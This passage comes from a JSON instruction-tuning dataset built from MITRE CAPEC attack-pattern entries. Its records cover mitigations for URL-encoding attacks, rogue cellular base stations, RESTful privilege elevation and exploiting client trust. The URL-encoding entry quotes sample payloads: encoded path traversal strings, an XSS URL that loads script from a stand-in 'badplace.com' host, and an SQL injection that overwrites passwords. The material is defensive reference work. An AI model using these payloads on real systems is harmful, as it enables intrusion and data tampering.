              "Description": "[Inject special characters into URL parameters] Using the information gathered in the \"Experiment\" phase, the adversary injects special characters into the URL using URL encoding. This can lead to path traversal, cross-site scripting, SQL injection, etc."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The application should accepts and decodes URL input.",
            "The application performs insufficient filtering/canonicalization on the URLs."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "An adversary can try special characters in the URL and bypass the URL validation."
            },
            {
              "@Level": "Medium",
              "#text": "The adversary may write a script to defeat the input filtering mechanism."
            }
          ]
        },
        "Indicators": {
          "Indicator": [
            "If the first decoding process has left some invalid or denylisted characters, that may be a sign that the request is malicious.",
            "Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Resource Consumption",
              "Note": "Denial of Service"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Refer to the RFCs to safely decode URL.",
            "Regular expression can be used to match safe URL patterns. However, that may discard valid URL requests if the regular expression is too restrictive.",
            "There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).",
            "Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.",
            "Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input.",
            "Be aware of the threat of alternative method of data encoding and obfuscation technique such as IP address encoding. (See related guideline section)",
            "When client input is required from web-based forms, avoid using the \"GET\" method to submit data, as the method causes the form data to be appended to the URL and is easily manipulated. Instead, use the \"POST method whenever possible."
          ]
        },
        "Example_Instances": {
          "Example": [
            {
              "xhtml:b": "URL Encodings in IceCast MP3 Server.",
              "xhtml:p": [
                "The following type of encoded string has been known traverse directories against the IceCast MP3 server9:",
                "or using",
                "The control character \"..\" can be used by an adversary to escape the document root."
              ],
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "#text": "http://[targethost]:8000/somefile/%2E%2E/target.mp3"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "#text": "\"/%25%25/\" instead of \"/../\"."
                }
              ],
              "#text": "See also: CVE-2001-0784"
            },
            {
              "xhtml:b": "Cross-Site Scripting",
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "attack",
                  "xhtml:b": "URL-Encoded attack:",
                  "#text": "http://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "result",
                  "xhtml:b": "HTML execution:",
                  "#text": "<script src=\"http://www.badplace.com/nasty.js\"></script>"
                }
              ],
              "xhtml:p": "[REF-495]"
            },
            {
              "xhtml:b": "SQL Injection",
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:b": "Original database query in the example file - \"login.asp\":",
                  "#text": "SQLQuery = \"SELECT preferences FROM logintable WHERE userid='\" & Request.QueryString(\"userid\") & \"' AND password='\" & Request.QueryString(\"password\") & \"';\""
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "attack",
                  "xhtml:b": "URL-encoded attack:",
                  "#text": "http://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "result",
                  "xhtml:b": "Executed database query:",
                  "#text": "SELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d';"
                }
              ],
              "xhtml:p": "From \"URL encoded attacks\", by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html"
            },
            {
              "xhtml:b": "Combined Encodings CesarFTP",
              "xhtml:p": [
                "Alexandre Cesari released a freeware FTP server for Windows that fails to provide proper filtering against multiple encoding. The FTP server, CesarFTP, included a Web server component that could be attacked with a combination of the triple-dot and URL encoding attacks.",
                "An adversary could provide a URL that included a string like",
                "This is an interesting exploit because it involves an aggregation of several tricks: the escape character, URL encoding, and the triple dot."
              ],
              "xhtml:div": {
                "@style": "margin-left:1em;",
                "@class": "informative",
                "#text": "/...%5C/"
              },
              "#text": "See also: CVE-2001-1335"
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "173"
            },
            {
              "@CWE_ID": "177"
            },
            {
              "@CWE_ID": "172"
            },
            {
              "@CWE_ID": "73"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-1"
            },
            {
              "@External_Reference_ID": "REF-495"
            },
            {
              "@External_Reference_ID": "REF-496"
            },
            {
              "@External_Reference_ID": "REF-497"
            },
            {
              "@External_Reference_ID": "REF-498"
            },
            {
              "@External_Reference_ID": "REF-499"
            },
            {
              "@External_Reference_ID": "REF-500",
              "@Section": "5.11.4. Validating Hypertext Links (URIs/URLs)"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances, Indicators, Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Execution_Flow, Extended_Description, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Retrieve list of mitigations for the  attack pattern - Cellular Rogue Base Station (CAPEC ID: 617)",
    "context": "",
    "output": "Sure. Here is the requested list of mitigations: Passively monitor cellular network connection for real-time threat detection and logging for manual review.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": "Passively monitor cellular network connection for real-time threat detection and logging for manual review.",
      "@Name": "Cellular Rogue Base Station (CAPEC ID: 617)",
      "attack_ptrn": {
        "@ID": "617",
        "@Name": "Cellular Rogue Base Station",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "In this attack scenario, the attacker imitates a cellular base station with their own \"rogue\" base station equipment. Since cellular devices connect to whatever station has the strongest signal, the attacker can easily convince a targeted cellular device (e.g. the retransmission device) to talk to the rogue base station.",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "616",
            "Exclude_Related": [
              {
                "@Exclude_ID": "403"
              },
              {
                "@Exclude_ID": "437"
              },
              {
                "@Exclude_ID": "513"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": "None"
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "This technique has been demonstrated by amateur hackers and commercial tools and open source projects are available to automate the attack."
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data",
            "Note": "Intercept and control cellular data communications to/from mobile device."
          }
        },
        "Mitigations": {
          "Mitigation": "Passively monitor cellular network connection for real-time threat detection and logging for manual review."
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2015-11-09"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Return the mitigations to the following attack pattern: Restful Privilege Elevation (CAPEC ID: 58)",
    "context": "",
    "output": "For attack pattern Restful Privilege Elevation (CAPEC ID: 58), the list of mitigations is: Design: Enforce principle of least privilege\n* Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side\n* Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": [
        "Design: Enforce principle of least privilege",
        "Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side",
        "Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose"
      ],
      "@Name": "Restful Privilege Elevation (CAPEC ID: 58)",
      "attack_ptrn": {
        "@ID": "58",
        "@Name": "Restful Privilege Elevation",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary identifies a Rest HTTP (Get, Put, Delete) style permission method allowing them to perform various malicious actions upon server data due to lack of access control mechanisms implemented within the application service accepting HTTP messages.",
        "Extended_Description": {
          "xhtml:p": "Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "1"
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "180",
              "Exclude_Related": {
                "@Exclude_ID": "515"
              }
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The attacker needs to be able to identify HTTP Get URLs. The Get methods must be set to call applications that perform operations other than get such as update and delete."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "It is relatively straightforward to identify an HTTP Get method that changes state on the server side and executes against an over-privileged system interface"
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Enforce principle of least privilege",
            "Implementation: Ensure that HTTP Get methods only retrieve state and do not alter state on the server side",
            "Implementation: Ensure that HTTP methods have proper ACLs based on what the functionality they expose"
          ]
        },
        "Example_Instances": {
          "Example": "The HTTP Get method is designed to retrieve resources and not to alter the state of the application or resources on the server side. However, developers can easily code programs that accept a HTTP Get request that do in fact create, update or delete data on the server. Both Flickr (http://www.flickr.com/services/api/flickr.photosets.delete.html) and del.icio.us (http://del.icio.us/api/posts/delete) have implemented delete operations using standard HTTP Get requests. These HTTP Get methods do delete data on the server side, despite being called from Get which is not supposed to alter state."
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "267"
            },
            {
              "@CWE_ID": "269"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-463"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I mitigate the following CAPEC attack pattern: Exploiting Trust in Client (CAPEC ID: 22)",
    "context": "",
    "output": "Here are the mitigations relevant for Exploiting Trust in Client (CAPEC ID: 22):\nDesign: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.\n- Design: Do not rely on client validation or encoding for security purposes.\n- Design: Utilize digital signatures to increase authentication assurance.\n- Design: Utilize two factor authentication to increase authentication assurance.\n- Implementation: Perform input validation for all remote content.",
    "category": "CAPECFlan",
    "instruction_type": "capec_mitigations",
    "parsed_raw_data": {
      "Mitigations": [
        "Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.",
        "Design: Do not rely on client validation or encoding for security purposes.",
        "Design: Utilize digital signatures to increase authentication assurance.",
        "Design: Utilize two factor authentication to increase authentication assurance.",
        "Implementation: Perform input validation for all remote content."
      ],
      "@Name": "Exploiting Trust in Client (CAPEC ID: 22)",
      "attack_ptrn": {
        "@ID": "22",
        "@Name": "Exploiting Trust in Client",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by communicating directly with the server where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Prerequisites": {
          "Prerequisite": "Server software must rely on client side formatted and validated values, and not reinforce these checks on the server side."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker must have fairly detailed knowledge of the syntax and semantics of client/server communications protocols and grammars"
          }
        },
        "Resources_Required": {
          "Resource": "Ability to communicate synchronously or asynchronously with server"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.",
            "Design: Do not rely on client validation or encoding for security purposes.",
            "Design: Utilize digital signatures to increase authentication assurance.",
            "Design: Utilize two factor authentication to increase authentication assurance.",
            "Implementation: Perform input validation for all remote content."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.",
            "Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.",
            "Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.",
            "Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "290"
            },
            {
              "@CWE_ID": "287"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "200"
            },
            {
              "@CWE_ID": "693"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Description Summary, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Exploiting Trust in Client (aka Make the Client Invisible)"
          }
        }
      }
    }
  }
]